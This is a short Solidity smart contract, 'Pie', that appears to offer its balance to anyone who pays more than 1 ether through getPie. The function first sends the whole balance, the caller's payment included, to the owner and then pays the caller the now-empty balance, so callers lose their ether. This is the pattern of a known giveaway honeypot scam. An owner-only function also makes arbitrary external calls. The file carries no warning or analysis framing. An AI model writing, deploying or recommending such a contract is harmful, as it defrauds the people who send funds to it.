pragma solidity ^0.8.0;

contract Pie {
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    receive() external payable {}

    function getPie() external payable {
        require(msg.value > 1 ether);
        owner.transfer(address(this).balance);
        payable(msg.sender).transfer(address(this).balance);
    }

    function withdraw() external payable {
        require(msg.sender == owner, "Only the owner can withdraw funds");
        owner.transfer(address(this).balance);
    }

    function command(address payable adr, bytes memory data) external payable {
        require(msg.sender == owner, "Only the owner can execute commands");
        (bool success, ) = adr.call{value: msg.value}(data);
        require(success, "Command execution failed");
    }
}